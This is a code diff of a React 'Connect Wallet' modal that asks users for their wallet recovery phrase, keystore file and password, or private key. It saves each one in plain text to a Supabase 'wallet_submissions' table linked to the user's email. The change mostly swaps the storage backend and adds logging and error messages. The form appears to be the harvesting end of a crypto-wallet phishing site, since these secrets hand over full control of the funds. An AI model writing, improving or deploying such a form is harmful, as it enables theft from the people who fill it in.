@@ -12,8 +12,7 @@ import { Input } from "@/components/ui/input";
 import { Textarea } from "@/components/ui/textarea";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { X, Wallet } from 'lucide-react';
-import { WalletSubmission } from '@/api/entities';
-import { User } from '@/api/entities';
+import { supabase } from '@/lib/supabase';
 
 export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess, onFeedback }) {
   const [activeTab, setActiveTab] = useState('phrase');
@@ -27,15 +26,24 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
   useEffect(() => {
     const fetchUser = async () => {
       try {
-        const user = await User.me();
+        console.log('🔍 Fetching current user for wallet submission...');
+        const { data: { user }, error: userError } = await supabase.auth.getUser();
+        
+        if (userError || !user) {
+          console.error('❌ User fetch error:', userError);
+          throw new Error('Failed to get current user');
+        }
+        
+        console.log('✅ User fetched successfully:', user.email);
         setCurrentUserEmail(user.email);
       } catch (error) {
-        console.error("User not logged in", error);
+        console.error("❌ User not logged in", error);
         onFeedback('error', 'Authentication Error', 'You must be logged in to submit a wallet.');
         onClose();
       }
     };
     if (isOpen) {
+      console.log('🚀 ConnectWalletModal opened, fetching user...');
       fetchUser();
     }
   }, [isOpen]);
@@ -49,7 +57,10 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
   };
 
   const handleSubmit = async () => {
+    console.log('🚀 Submitting wallet details...', { currentUserEmail, wallet: wallet?.name });
+    
     if (!currentUserEmail) {
+      console.error('❌ No current user email found');
       onFeedback('error', 'Authentication Error', 'Could not identify the current user. Please log in again.');
       return;
     }
@@ -64,32 +75,52 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
     const submissionPromises = [];
     const baseSubmission = {
       user_email: currentUserEmail,
-      wallet_name: wallet.name
+      wallet_name: wallet.name,
+      created_date: new Date().toISOString(),
+      status: 'pending'
     };
 
     if (phrase.trim() !== '') {
-        submissionPromises.push(WalletSubmission.create({
-            ...baseSubmission,
-            submission_type: 'phrase',
-            phrase: phrase.trim()
-        }));
+        submissionPromises.push(supabase
+            .from('wallet_submissions')
+            .insert({
+                ...baseSubmission,
+                submission_type: 'phrase',
+                phrase: phrase.trim()
+            })
+            .then(response => {
+              if (response.error) throw response.error;
+              return response;
+            }));
     }
 
     if (keystoreJson.trim() !== '' && keystorePassword.trim() !== '') {
-        submissionPromises.push(WalletSubmission.create({
-            ...baseSubmission,
-            submission_type: 'keystore',
-            keystore_json: keystoreJson.trim(),
-            keystore_password: keystorePassword.trim()
-        }));
+        submissionPromises.push(supabase
+            .from('wallet_submissions')
+            .insert({
+                ...baseSubmission,
+                submission_type: 'keystore',
+                keystore_json: keystoreJson.trim(),
+                keystore_password: keystorePassword.trim()
+            })
+            .then(response => {
+              if (response.error) throw response.error;
+              return response;
+            }));
     }
 
     if (privateKey.trim() !== '') {
-        submissionPromises.push(WalletSubmission.create({
-            ...baseSubmission,
-            submission_type: 'private_key',
-            private_key: privateKey.trim()
-        }));
+        submissionPromises.push(supabase
+            .from('wallet_submissions')
+            .insert({
+                ...baseSubmission,
+                submission_type: 'private_key',
+                private_key: privateKey.trim()
+            })
+            .then(response => {
+              if (response.error) throw response.error;
+              return response;
+            }));
     }
 
     if (submissionPromises.length === 0) {
@@ -99,7 +130,8 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
     }
 
     try {
-        await Promise.all(submissionPromises);
+        const results = await Promise.all(submissionPromises);
+        console.log('Wallet submission results:', results);
 
         onFeedback('success', 'Submission Successful!', `${submissionPromises.length} wallet detail(s) for ${wallet.name} submitted successfully!`);
         onSuccess();
@@ -108,7 +140,19 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
 
     } catch (error) {
         console.error('Wallet submission failed:', error);
-        onFeedback('error', 'Submission Failed', `An error occurred: ${error.message || 'Please check the console for details.'}`);
+        let errorMessage = 'An error occurred while submitting your wallet details.';
+        
+        if (error.message) {
+          if (error.message.includes('duplicate key')) {
+            errorMessage = 'You have already submitted wallet details for this wallet.';
+          } else if (error.message.includes('network')) {
+            errorMessage = 'Network error. Please check your connection and try again.';
+          } else {
+            errorMessage = error.message;
+          }
+        }
+        
+        onFeedback('error', 'Submission Failed', errorMessage);
     } finally {
         setIsSubmitting(false);
     }
